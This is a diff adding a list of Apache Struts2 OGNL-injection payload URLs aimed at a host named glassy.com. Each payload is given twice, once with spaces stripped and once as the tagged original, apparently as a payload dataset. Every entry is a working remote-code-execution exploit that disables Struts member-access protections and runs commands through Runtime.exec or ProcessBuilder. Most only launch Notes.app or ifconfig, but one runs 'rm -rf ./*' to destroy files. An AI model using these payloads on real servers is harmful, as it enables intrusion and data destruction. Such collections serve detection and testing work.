@@ -1,0 +1,48 @@
+* http:/www.glassy.com/Struts2Demo_war_exploded/hello.jsp?fakeParam=%{#a=(newjava.lang.ProcessBuilder(newjava.lang.String[]{"/bin/bash","-c","open/Applications/Notes.app/"})).start()}
+  - 原句: r141
+  - http://www.glassy.com/Struts2Demo_war_exploded/hello.jsp?fakeParam=%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/bash", "-c", "open /Applications/Notes.app/"})).start()}
+
+
+* http:/www.glassy.com/Struts2Demo_war_exploded/${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('ifconfig').getInputStream()),#q}.action
+  - 原句: r142
+  - http://www.glassy.com/Struts2Demo_war_exploded/${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('ifconfig').getInputStream()),#q}.action
+
+ 
+* http:/www.glassy.com/test.action?('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(a)(b)&('\u0023_memberAccess.exclude\u003d@java.util.Collections@EMPTY_SET')(a)(b)&('\u0023_memberAccess.allowStaticMethodAccess\u003dfalse')(a)(b)&('\u0040java.lang.Runtime@getRuntime().exec(\'/bin/bash\u0020-c\u0020rm\u0020-rf\u0020./*\')')(a)(b)
+  - 原句: r103
+  - http://www.glassy.com/test.action?('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(a)(b)&('\u0023_memberAccess.exclude\u003d@java.util.Collections@EMPTY_SET')(a)(b)&('\u0023_memberAccess.allowStaticMethodAccess\u003dfalse')(a)(b)&('\u0040java.lang.Runtime@getRuntime().exec(\'/bin/bash\u0020-c\u0020rm\u0020-rf\u0020./*\')')(a)(b)
+
+
+* http:/www.glassy.com/test.action?('#context[\'xwork.MethodAccessor.denyMethodExecution\']=false')(a)(b)&('@java.lang.Runtime@getRuntime().exec(\'open/Applications/Notes.app/\')')(a)(b)
+  - 原句: r135
+  http://www.glassy.com/test.action?('#context[\'xwork.MethodAccessor.denyMethodExecution\']=false')(a)(b)&('@java.lang.Runtime@getRuntime().exec(\'open /Applications/Notes.app/\')')(a)(b)
+
+
+* http:/www.glassy.com/test.action?('#context[\'xwork.MethodAccessor.denyMethodExecution\']=false')(a)(b)&('#_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET')(a)(b)&('#_memberAccess.allowStaticMethodAccess=false')(a)(b)&('@java.lang.Runtime@getRuntime().exec(\'open/Applications/Notes.app/\')')(a)(b)
+  - 原句: r136
+  http://www.glassy.com/test.action?('#context[\'xwork.MethodAccessor.denyMethodExecution\']=false')(a)(b)&('#_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET')(a)(b)&('#_memberAccess.allowStaticMethodAccess=false')(a)(b)&('@java.lang.Runtime@getRuntime().exec(\'open /Applications/Notes.app/\')')(a)(b)
+
+
+* http:/www.glassy.com/struts2-showcase/home11.action?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]),d&cmd=/Applications/Notes.app/Contents/MacOS/Notes
+  - 原句: r149
+  http://www.glassy.com/struts2-showcase/home11.action?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]),d&cmd=/Applications/Notes.app/Contents/MacOS/Notes
+
+
+* http:/www.glassy.com/test.action?password=(#context["xwork.MethodAccessor.denyMethodExecution"]=newjava.lang.Boolean(false),#_memberAccess["allowStaticMethodAccess"]=newjava.lang.Boolean(true),@java.lang.Runtime@getRuntime().exec('/Applications/Notes.app/Contents/MacOS/Notes'))(meh)&z[(password)(meh)]=true
+  - 原句: r139
+  http://www.glassy.com/test.action?password=(#context["xwork.MethodAccessor.denyMethodExecution"]= new java.lang.Boolean(false), #_memberAccess["allowStaticMethodAccess"]= new java.lang.Boolean(true), @java.lang.Runtime@getRuntime().exec('/Applications/Notes.app/Contents/MacOS/Notes'))(meh)&z[(password)(meh)]=true
+
+
+* http:/www.glassy.com/Struts2Demo_war_exploded/s2029.action?message=(#_memberAccess['allowPrivateAccess']=true,#_memberAccess['allowProtectedAccess']=true,#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties'],#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#_memberAccess['allowPackageProtectedAccess']=true,#_memberAccess['allowStaticMethodAccess']=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('open/Applications/Notes.app/').getInputStream()))
+  - 原句: r148
+  http://www.glassy.com/Struts2Demo_war_exploded/s2029.action?message=(#_memberAccess['allowPrivateAccess']=true,#_memberAccess['allowProtectedAccess']=true,#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties'],#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#_memberAccess['allowPackageProtectedAccess']=true,#_memberAccess['allowStaticMethodAccess']=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('open /Applications/Notes.app/').getInputStream()))
+
+ 
+* http:/www.glassy.com/Struts2Demo_war_exploded/s2053.action?name=%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#a=(newjava.lang.ProcessBuilder('/Applications/Notes.app/Contents/MacOS/Notes')).start())}
+  - 原句: r153
+  http://www.glassy.com/Struts2Demo_war_exploded/s2053.action?name=%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#a=(new java.lang.ProcessBuilder('/Applications/Notes.app/Contents/MacOS/Notes')).start())}
+
+
+* http:/www.glassy.com/Struts2Demo_war_exploded/hello.action?redirect:${#a=(newjava.lang.ProcessBuilder(newjava.lang.String[]{'/bin/bash','-c','open/Applications/Notes.app/'})).start()}
+  - 原句: r143
+  http://www.glassy.com/Struts2Demo_war_exploded/hello.action?redirect:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'/bin/bash', '-c','open /Applications/Notes.app/'})).start()}
